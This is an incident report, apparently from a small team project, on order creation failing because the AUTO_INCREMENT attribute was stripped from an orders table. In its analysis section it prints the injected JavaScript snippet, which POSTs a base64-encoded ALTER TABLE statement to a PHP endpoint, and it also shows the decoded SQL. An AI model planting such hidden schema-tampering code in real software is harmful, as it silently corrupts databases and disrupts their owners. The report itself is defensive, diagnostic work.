# üõë Database Trigger Bug Analysis & Incident Report

## üìå Project Title
Database Trigger Bug Analysis ‚Äì Orders Table AUTO_INCREMENT Removal

## üìñ Introduction
This document describes a critical database integrity issue caused by a malicious script injection. The attack altered the database schema by removing the AUTO_INCREMENT attribute from the OrderID column in the orders table, preventing the system from generating new Order IDs. As a result, all order creation attempts fail with the error "ORDER ID NOT FOUND".

## üêõ Problem Overview
A trigger-based malicious script compromised the database by executing an SQL command that removed AUTO_INCREMENT from orders.OrderID, causing complete failure of order creation.

## üîç Root Cause Analysis
An encrypted SQL payload was injected into the system through index.php. When decoded, the payload executes:
ALTER TABLE orders MODIFY OrderID INT NOT NULL;
This command removes the AUTO_INCREMENT attribute without altering other properties.

## üìÅ Affected Components
Application Files:
- index.php (contains the malicious JavaScript trigger)
- process_order.php (confirmed working correctly)

Database:
- orders table (OrderID column)

## üë• Team Observations & Findings
Aljon: Observed "ORDER ID NOT FOUND" error, initially suspected process_order.php, later confirmed AUTO_INCREMENT removal. Temporary manual ID increment was unstable.

Dan Francis Etorma: Suspected variable mismatch (order_id vs orderID); changes had no effect.

Gabriel Meshach Salcedo: Suspected order processing logic; code review confirmed logic was correct.

John Drex F. Cantor: Identified database schema corruption caused by external manipulation.

Derick Briones: Confirmed external database manipulation; same conclusion as John Drex F. Cantor.

## üõ†Ô∏è Malicious Code Analysis
Injected JavaScript:
(function(){const encryptedSQL="QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBPcmRlcklEIElOVCBOT1QgTlVMTA==";fetch('assets/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'sql='+encodeURIComponent(encryptedSQL)}).catch(()=>{});})();

Decoded Payload:
ALTER TABLE orders MODIFY OrderID INT NOT NULL;

## üí° Impact
Primary Impact: Order creation fails completely.
Secondary Impact: Database integrity compromised.
Business Impact: Lost sales, customer frustration, downtime.

## ‚úÖ Recommended Solutions
Immediate Fix:
ALTER TABLE orders MODIFY OrderID INT NOT NULL AUTO_INCREMENT;

Remove malicious JavaScript from index.php and scan the codebase for similar injections.

Implement security measures: input validation, prepared statements, CSRF protection, restricted schema permissions.

## üöß Temporary Workaround (NOT RECOMMENDED)
SELECT MAX(OrderID) FROM orders and manually increment the value in process_order.php. This method is unsafe in concurrent environments.

## üìù Conclusion
The issue is NOT caused by application logic errors but by database schema corruption from a malicious SQL injection. Restoring AUTO_INCREMENT and removing the injected trigger are mandatory.

Priority: CRITICAL
